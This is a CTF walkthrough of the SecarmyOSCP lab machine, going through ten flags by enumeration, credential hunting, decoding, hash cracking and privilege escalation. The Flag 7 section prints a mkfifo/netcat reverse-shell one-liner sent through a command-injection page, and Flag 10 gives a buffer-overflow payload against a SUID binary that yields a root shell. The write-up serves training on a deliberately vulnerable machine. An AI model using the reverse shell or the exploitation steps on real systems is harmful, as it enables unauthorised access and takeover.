## Introduction

**SecarmyOSCP** is one challenge of the many CTF challenges that there were in the SecarmyVillage 2020. In this challenge you will have to get 10 flags correspoding each one to a different challenge covering different topics from web to pwn.

## Enumeration

First of all, it is needed to scan all open ports that there are in the machine.

```bash
kali@kali:~$ sudo nmap -sS -p- -n --open -T5 192.168.226.138
[sudo] password for kali: 
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-09 12:42 EST
Nmap scan report for 192.168.226.138
Host is up (0.00047s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh

Nmap done: 1 IP address (1 host up) scanned in 2.97 seconds
```

In order to know more in depth which services are running inside each port, the next command has been executed.

```bash
kali@kali:$ sudo nmap -sC -sV -p21,22,80,1337 -n --open -T5 192.168.226.138

Based on the previous results the following information has been gathered.

1.   **FTP** allows to login clients anonymously.
2.   **SSH** service for Ubuntu.
3.   **HTTP** stores a web site named "Totally Secure Website".
4.   **1337**  seems to be a Password recovery service.

## Flag 1

Accessing to the website appears the following title.

![image-20201109190135065](/assets/img/secarmy20/image-20201109190135065.png)

Using *gobuster* provides the following directories.

```bash
kali@kali:~$ gobuster dir -t 20 -u http://192.168.226.138/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

Looking inside http://192.168.226.138/anon/ appears another title.

![image-20201109190912522](/assets/img/secarmy20/image-20201109190912522.png)

However, at simple view doesn't seem something like a flag, but looking into the **HTML** code appears the credentials for user *uno*. The credentials can be used to access to the machine via **SSH**, where the flag is stored at the home folder.

## Flag 2

Reading the "readme.txt" file appears the credentials for the second user. After becoming the user "dos" there is another "readme.txt" file with a quest inside.

```bash
uno@svos:~$ su - dos
Password: 
dos@svos:~$ cat readme.txt 
You are required to find the following string inside the files folder:
a8211ac1853a1235d48829414626512a
```

To solve it you can use the following commands.

```bash
dos@svos:~$ grep -R a8211ac1853a1235d48829414626512a files/
files/file4444.txt:a8211ac1853a1235d48829414626512a
dos@svos:~$ tail files/file4444.txt
Tomorrow will bring something new, so leave today as a memory.
Never underestimate the willingness of the greedy to throw you under the bus.
She had that tint of craziness in her soul that made her believe she could actually make a difference.
A purple pig and a green donkey flew a kite in the middle of the night and ended up sunburnt.
There are no heroes in a punk rock band.
The sky is clear; the stars are twinkling.
The beauty of the African sunset disguised the danger lurking nearby.

a8211ac1853a1235d48829414626512a
Look inside file3131.txt
dos@svos:~$ cat files/file3131.txt

This long string turn out to be an "application.zip" file that you can get using the following [website](https://base64.guru/converter/decode/file). In order to unzip the file you can use the following command.

```bash
kali@kali:$ unzip application.zip
Archive:  application.zip
   creating: challenge2/
  inflating: challenge2/flag2.txt    
  inflating: challenge2/todo.txt 
```

Inside the file "todo.txt" there is a special toke.

## Flag 3

```bash
kali@kali:$ cat challenge2/todo.txt 
Although its total WASTE but... here is your super secret token: c8e6afe38c2ae9a0283ecfb4e1b7c10f7d96e54c39e727d0e5515ba24a4d1f1b
```

As it has been said previously said, there is a service which requires a token to retrieve a password that can be accessed using **netcat** .

```bash
kali@kali:$ nc 192.168.226.138 1337

 Welcome to SVOS Password Recovery Facility!
 Enter the super secret token to proceed: c8e6afe38c2ae9a0283ecfb4e1b7c10f7d96e54c39e727d0e5515ba24a4d1f1b

 Here is your login credentials for the third user tres:r4f43l71n4j3r0
```

These credentials are used for the **FTP** service, where there are two files despite the flag.

## Flag 4

```bash
kali@kali:/mnt/hgfs/2_MisPostsBlog/CTFs/HTB$ ftp 192.168.226.138

220 Welcome to the second challenge!

```

The hint for the next flag is the following.

```bash
kali@kali:/mnt/hgfs/2_MisPostsBlog/CTFs/HTB$ cat readme.txt 
A collection of conditionals has been added in the secarmy-village binary present in this folder reverse it and get the fourth user\'s credentials , if you have any issues with accessing the file you can head over to: https://mega.nz/file/XodTiCJD#YoLtnkxzRe_BInpX6twDn_LFQaQVnjQufFj3Hn1iEyU 
```

Using the tool **strings** provide as the password for the user *cuatro*.

```bash
kali@kali:$ strings -n 7 secarmy-village
...
o:p3dr00l1v4r3zct
...
```

However, the actual password for user *cuatro* is "p3dr00l1v4r3z".

## Flag 5

In the "todo.txt" file there is the next challenge for the flag 5.

```bash
cuatro@svos:~$ cat todo.txt 
We have just created a new web page for our upcoming platform, its a photo gallery. You can check them out at /justanothergallery on the webserver.
```

It is a web site with a bunch of QR codes.

![image-20201109200546547](/assets/img/secarmy20/image-20201109200546547.png)

In order to download all of them you need to execute the following command.

```bash
kali@kali:$ wget -r -N --no-parent --reject '*index.html*' -nH --cut-dirs=1 http://192.168.226.138/justanothergallery/
```

Now, in order to decode them you can execute these script.

```python
import os

for i in range(0,69):
print(os.popen("zbarimg QRs/image-"+str(i)+".png | grep 'QR-Code'").read())
```

Between all these lines that appear on the screen, you can get the user *cinco*'s credentials for SSH.

```bash
...
QR-Code:cinco:ruy70m35
...
```

## Flag 6

Doing cat in cinco's home directory shows the information for the next challenge.

```bash
cinco@svos:~$ cat readme.txt 
Check for Cinco's secret place somewhere outside the house
```

There is a file in */cinco-secrets/*  named *shadow.bak* owned by *cinco* but with just write permissions, so in order to read its contents its permissions must be change using the following command.

```bash
cinco@svos:~$ chmod 777 shadow.bak
```

The last line can be copied into a new file on our machine so we can extract *seis*'s password using **JohnTheRipper**. The command will be the following.

```bash
kali@kali:$ john shadow.bak -w=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])

Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

## Flag 7

```bash
seis@svos:~$ cat readme.txt 
head over to /shellcmsdashboard webpage and find the credentials!
```

The web site looks like this, where we need to find some credentials to access to the Shell CMS.

![image-20201109221632248](/assets/img/secarmy20/image-20201109221632248.png)

The credentials are stored at the *robots.txt* file in the following URL http://192.168.226.138/shellcmsdashboard/robots.txt 

```html
# Username: admin Password: qwerty
User-agent: *
Allow: /
```

Introducing the credentials appears a text saying "head over to /aabbzzee.php", accessing to that file appears a users searcher. 

It appears to be executing ***bash*** commands, because sending  "echo 'HOLA' " shows "HOLA" on the we web page, so we can create a reverse shell getting access to the virtual machine. In order to do that we need to write the following command in our virtual machine

```bash
kali@kali:$ rlwrap -nc -nlvp 4444
```

and sending this command (You need to change the IP address).

```bash
touch /tmp/f; rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.226.136 4444 > /tmp/f
```

In the */var/www/html/shellcmsdashboard* folder there is a file named *readme9213.txt* owned by www-data but without read permission. However, changing its permissions  we can retrieve the password for user *siete*.

```bash
$ chmod 777 readme9213.txt
$ cat readme9213.txt
password for the seventh user is 6u1l3rm0p3n473
```

## Flag 8

In the *siete*'s home directory there are several files.

```bash
siete@svos:~$ ls -l

The *password.zip* file requires a password to get the file *password.txt* for that you need to decrypt the *message.txt* using the key "x". To do so you need to visit the following [page](https://www.dcode.fr/xor-cipher).

## Flag 9

In the *ocho*'s home directory there is a *keyboard.pcapng * that you need to download in order to look what is inside with *wireshark*. Applying the filer "tcp.stream eq 200".

Then right click into some GET package */Follow/HTTP Stream/* 

Reading the text appears some encrypted stuff which can be decrypted with the following [link](https://www.dcode.fr/keyboard-shift-cipher).

## Flag 10

Inside the *nueve*'s home directory there is a binary with [SETUID](https://en.wikipedia.org/wiki/Setuid) as root.

```bash
nueve@svos:~$ ls -l
total 28
-rwxrwxr-x 1 nueve nueve   29 Oct 29 21:51 exploit.txt
-rw-rw-r-- 1 nueve nueve   61 Oct  5 08:54 flag9.txt
---Sr-xr-x 1 root  root  8728 Oct  5 13:31 orangutan
-rw-r--r-- 1 root  root  6360 Oct 16 17:29 readme.txt
```

Using [ghidra](https://ghidra-sre.org/) we can see the source code of the program.

As we can see in the code, in order to get a shell as root we need to write the value *0xcafebabe* in the variable *local_10*.  In order to do so we need to create a **Buffer Overflow** in the variable *local_28* through the method *gets*.  The creation of the payload should look like this. (Python 2)

```bash
kali@kali:$ python -c "print 'A'*24+'\xbe\xba\xfe\xca'" > exploit.txt
```

Then, upload it to the *secarmy* machine using **scp** and execute it with the following command, becoming root }:) 

```bash
(cat exploit.txt; cat -) | ./orangutan
```
